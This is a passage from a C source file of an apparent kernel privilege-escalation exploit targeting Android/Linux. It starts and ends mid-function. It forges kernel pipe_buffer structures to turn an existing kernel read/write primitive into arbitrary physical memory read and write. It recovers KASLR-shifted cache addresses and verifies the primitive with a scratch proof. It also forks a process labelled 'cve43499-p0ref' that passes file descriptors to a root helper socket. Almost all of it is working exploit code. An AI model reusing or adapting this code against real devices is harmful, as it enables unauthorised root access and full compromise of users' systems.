            "head=%016zx cache=%zd/%d:%016llx type=%zd/%d:%08x\n",
            phase, allocations, off, page, pfn, page_meta,
            word08_ret, word08_errno, (unsigned long long)page_word08, head,
            cache_ret, cache_errno, (unsigned long long)slab_cache,
            type_ret, type_errno, (uint32_t)page_type);
#else
    pr_info("pipe reclaim snapshot phase=%s alloc=%zu page_off=%#zx "
            "head=%016zx cache=%zd/%d:%016llx type=%zd/%d:%08x\n",
            phase, allocations, off, head, cache_ret, cache_errno,
            (unsigned long long)slab_cache, type_ret, type_errno,
            (uint32_t)page_type);
#endif
  }
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  uint64_t canonical_slots[KMALLOC_CACHE_SLOTS];
  uint64_t runtime_alias_slots[KMALLOC_CACHE_SLOTS];
  uint64_t alias_first = 0;
  uint64_t canonical_first = 0;
  int64_t physvirt_offset_value = 0;
  uint64_t kimage_voffset_value = 0;
  memset(cache_slots, 0, sizeof(cache_slots));
  memset(canonical_slots, 0, sizeof(canonical_slots));
  memset(runtime_alias_slots, 0, sizeof(runtime_alias_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  uintptr_t kmalloc_caches_canonical = kaslr_image_addr(KMALLOC_CACHES);
  uintptr_t physvirt_offset_canonical =
      kaslr_image_addr(PHYSVIRT_OFFSET_IMAGE);
  uintptr_t kimage_voffset_canonical =
      kaslr_image_addr(KIMAGE_VOFFSET_IMAGE);
  errno = 0;
  ssize_t physvirt_offset_ret = kernel_read_data(
      fd, physvirt_offset_canonical, &physvirt_offset_value,
      sizeof(physvirt_offset_value));
  int physvirt_offset_errno = errno;
  errno = 0;
  ssize_t kimage_voffset_ret = kernel_read_data(
      fd, kimage_voffset_canonical, &kimage_voffset_value,
      sizeof(kimage_voffset_value));
  int kimage_voffset_errno = errno;
  uintptr_t kmalloc_caches_phys = 0;
  uintptr_t kmalloc_caches_runtime_alias = 0;
  ssize_t runtime_alias_table_ret = -1;
  int runtime_alias_table_errno = 0;
  if (physvirt_offset_ret == (ssize_t)sizeof(physvirt_offset_value) &&
      kimage_voffset_ret == (ssize_t)sizeof(kimage_voffset_value)) {
    kmalloc_caches_phys =
        kmalloc_caches_canonical - (uintptr_t)kimage_voffset_value;
    kmalloc_caches_runtime_alias =
        kmalloc_caches_phys - (uintptr_t)physvirt_offset_value;
    errno = 0;
    runtime_alias_table_ret = kernel_read_data(
        fd, kmalloc_caches_runtime_alias, runtime_alias_slots,
        sizeof(runtime_alias_slots));
    runtime_alias_table_errno = errno;
  }
  int runtime_alias_matches_canonical = 0;
  errno = 0;
  ssize_t alias_word_ret =
      kernel_read_data(fd, kmalloc_caches, &alias_first, sizeof(alias_first));
  int alias_word_errno = errno;
  errno = 0;
  ssize_t canonical_word_ret = kernel_read_data(
      fd, kmalloc_caches_canonical, &canonical_first, sizeof(canonical_first));
  int canonical_word_errno = errno;
  errno = 0;
  ssize_t alias_table_ret =
      kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  int alias_table_errno = errno;
  errno = 0;
  ssize_t canonical_table_ret = kernel_read_data(
      fd, kmalloc_caches_canonical, canonical_slots, sizeof(canonical_slots));
  int canonical_table_errno = errno;
  /* Compare complete snapshots after both reads have completed. */
  runtime_alias_matches_canonical =
      runtime_alias_table_ret == (ssize_t)sizeof(runtime_alias_slots) &&
      canonical_table_ret == (ssize_t)sizeof(canonical_slots) &&
      memcmp(runtime_alias_slots, canonical_slots,
             sizeof(runtime_alias_slots)) == 0;
  /* data_addr() still uses the profile's static physical load address. On
   * this firmware it points at a different mapping for kmalloc_caches. Only
   * let the cache gate consume the runtime-derived alias after a complete
   * byte-for-byte check against the canonical image mapping. */
  int cache_table_valid = runtime_alias_matches_canonical;
  if (cache_table_valid) {
    memcpy(cache_slots, runtime_alias_slots, sizeof(cache_slots));
  } else {
    memset(cache_slots, 0, sizeof(cache_slots));
  }
  pr_info("pipe live map globals physvirt_addr=%016zx ret=%zd/%d "
          "value=%016llx kimage_addr=%016zx ret=%zd/%d value=%016llx\n",
          physvirt_offset_canonical, physvirt_offset_ret,
          physvirt_offset_errno,
          (unsigned long long)(uint64_t)physvirt_offset_value,
          kimage_voffset_canonical, kimage_voffset_ret,
          kimage_voffset_errno,
          (unsigned long long)kimage_voffset_value);
  pr_info("pipe live map kmalloc_caches canonical=%016zx phys=%016zx "
          "runtime_alias=%016zx table=%zd/%d match=%d q0=%016llx "
          "q10=%016llx\n",
          kmalloc_caches_canonical, kmalloc_caches_phys,
          kmalloc_caches_runtime_alias, runtime_alias_table_ret,
          runtime_alias_table_errno, runtime_alias_matches_canonical,
          (unsigned long long)runtime_alias_slots[0],
          (unsigned long long)runtime_alias_slots[10]);
  pr_info("pipe cache table alias=%016zx canonical=%016zx bytes=%zu "
          "word=%zd/%d:%016llx,%zd/%d:%016llx "
          "table=%zd/%d,%zd/%d q0=%016llx,%016llx q10=%016llx,%016llx\n",
          kmalloc_caches, kmalloc_caches_canonical, sizeof(cache_slots),
          alias_word_ret, alias_word_errno,
          (unsigned long long)alias_first,
          canonical_word_ret, canonical_word_errno,
          (unsigned long long)canonical_first,
          alias_table_ret, alias_table_errno,
          canonical_table_ret, canonical_table_errno,
          (unsigned long long)cache_slots[0],
          (unsigned long long)canonical_slots[0],
          (unsigned long long)cache_slots[10],
          (unsigned long long)canonical_slots[10]);
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  const size_t pipe_cache_slot =
      KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + KMALLOC_PIPE_INDEX;
  kmalloc_pipe_cache =
      cache_table_valid && pipe_cache_slot < KMALLOC_CACHE_SLOTS
          ? cache_slots[pipe_cache_slot]
          : 0;
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (slab_cache != 0 && cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    errno = 0;
    ssize_t got = kernel_read_data(
        fd, base + off, slab + off, PIPE_SCAN_CHUNK);
    if (got != PIPE_SCAN_CHUNK) {
      pr_warning("pipe slab read off=%#zx target=%016zx ret=%zd errno=%d\n",
                 off, base + off, got, errno);
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

static int run_pipe_physrw_scratch_proof(int fd) {
  if (!page_base || pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    pr_error("physrw proof has no prepared page or correlated pipe\n");
    return 0;
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    pr_error("physrw proof address translation mismatch addr=%016zx page=%016zx\n",
             proof_addr, proof_page);
    return 0;
  }

  pipe_cache_gate_ok = 2;
  pr_info("physrw proof scratch addr=%016zx pipe_idx=%d\n",
          proof_addr, pipebuf_pipe_idx);

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    pr_error("physrw proof scratch seed failed\n");
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    pr_error("physrw proof 64-bit seed failed\n");
    return 0;
  }
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    physrw_write64_ok = 0;
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  pr_info("physrw proof result read=%d write=%d read64=%d write64=%d\n",
          physrw_read_ok, physrw_write_ok,
          physrw_read64_ok, physrw_write64_ok);
  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}

int install_pipe_physrw(int fd) {
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
  (void)fd;
  pr_warning("uclamp-trigger-only guard: refusing pipe physical-RW\n");
  return 0;
#else
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }
  if (!run_pipe_reclaim_diagnostic(fd)) {
    pr_warning("pipe physical read/write rejected: reclaim or marker "
               "correlation gate failed; root installation skipped\n");
    return 0;
  }
  return run_pipe_physrw_scratch_proof(fd);
#endif
}

/* Fill ordinary pipes with per-pipe markers. Require both the expected slab
 * cache and a live buffer whose page contains that pipe's own marker before
 * allowing the physical read/write proof to use the candidate. */
int run_pipe_reclaim_diagnostic(int fd) {
  if (pipebuf_page_base == 0) {
    pr_error("pipe reclaim trace has no candidate order-3 page\n");
    return 0;
  }

  uintptr_t order3_base = pipebuf_page_base;
  int cache_match = pipe_reclaim_cache_gate(fd);
  uintptr_t matched_page = pipebuf_page_base;
  pipebuf_page_base = order3_base;
  if (!cache_match ||
      (matched_page & ~(ORDER3_SIZE - 1)) != order3_base) {
    pr_warning("pipe reclaim gate rejected cache_match=%d page_index=%d "
               "matched_page=%016zx order3_base=%016zx\n",
               cache_match, pipe_cache_page_index,
               matched_page, order3_base);
    return 0;
  }
  pr_info("pipe reclaim cache gate passed page=%016zx page_index=%d "
          "cache=%016llx\n",
          matched_page, pipe_cache_page_index,
          (unsigned long long)candidate_slab_cache);

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  int found_any = 0;
  int correlation_verified = 0;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    size_t len = i + 1;
    uint64_t marker_word = 0x524d475000000000ULL | (uint64_t)len;
    memcpy(marker, &marker_word, sizeof(marker_word));
    ssize_t wrote = write(pipe_fds_reclaim[i][1], marker, len);
    if (wrote != (ssize_t)len) {
      pr_warning("pipe reclaim trace write failed pipe=%zu len=%zu "
                 "ret=%zd errno=%d\n", i, len, wrote, errno);
      return 0;
    }

    size_t pipes_filled = i + 1;
    if (pipes_filled % PIPE_OBJS_PER_SLAB != 0 &&
        pipes_filled != PIPE_RECLAIM)
      continue;

    pipe_reclaim_snapshot("pipe-marker-batch", pipebuf_page_base,
                          pipes_filled);
    int found = find_pipe_buffer(fd, pipebuf_page_base);
    found_any |= found;
    uintptr_t data_page = 0;
    uint64_t observed_marker = 0;
    uint64_t expected_marker = 0;
    ssize_t marker_read = -1;
    int marker_errno = 0;
    int marker_match = 0;
    if (found && pipebuf_pipe_idx >= 0) {
      expected_marker = 0x524d475000000000ULL |
                        (uint64_t)(pipebuf_pipe_idx + 1);
      data_page = page_to_direct((uintptr_t)pipe_probe_page);
      if (is_direct_ptr(data_page)) {
        errno = 0;
        marker_read = kernel_read_data(
            fd, data_page, &observed_marker, sizeof(observed_marker));
        marker_errno = errno;
        marker_match = marker_read == (ssize_t)sizeof(observed_marker) &&
                       observed_marker == expected_marker;
      }
    }
    size_t slab_offset = found ? (size_t)(pipebuf_addr - pipebuf_page_base) : 0;
    size_t object_offset = slab_offset % PIPE_OBJECT_SIZE;
    pr_info("pipe reclaim correlation pipes=%zu found=%d matched=%d "
            "idx=%d buf=%016zx slab_off=%#zx obj_off=%#zx "
            "page=%016llx data=%016zx offset=0 ops=%016llx "
            "len=%u flags=%u private=%016llx "
            "read=%zd/%d marker=%016llx expected=%016llx "
            "scan=%d/%d/%d first_page=%016llx first_ops=%016llx "
            "first_len=%u first_flags=%u q0=%016llx q1=%016llx "
            "q2=%016llx q3=%016llx\n",
            pipes_filled, found, marker_match, pipebuf_pipe_idx,
            (size_t)pipebuf_addr, slab_offset, object_offset,
            (unsigned long long)pipe_probe_page, (size_t)data_page,
            (unsigned long long)pipe_probe_ops, pipe_probe_len,
            pipe_probe_flags, (unsigned long long)pipe_probe_private,
            marker_read, marker_errno,
            (unsigned long long)observed_marker,
            (unsigned long long)expected_marker,
            pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len,
            (unsigned long long)pipe_scan_first_page,
            (unsigned long long)pipe_scan_first_ops,
            pipe_scan_first_len, pipe_scan_first_flags,
            (unsigned long long)pipe_scan_q0,
            (unsigned long long)pipe_scan_q1,
            (unsigned long long)pipe_scan_q2,
            (unsigned long long)pipe_scan_q3);
    if (marker_match) {
      correlation_verified = 1;
      break;
    }
  }

  pr_info("pipe reclaim trace done found_any=%d correlated=%d idx=%d\n",
          found_any, correlation_verified, pipebuf_pipe_idx);
  return correlation_verified;
}

#if RMG_DIAG_PIPE_RECLAIM_TRACE
int run_pipe_reclaim_physrw_diagnostic(int fd) {
  if (!run_pipe_reclaim_diagnostic(fd))
    return 0;
  pr_info("pipe marker correlation passed; running scratch physrw proof\n");
  return run_pipe_physrw_scratch_proof(fd);
}
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
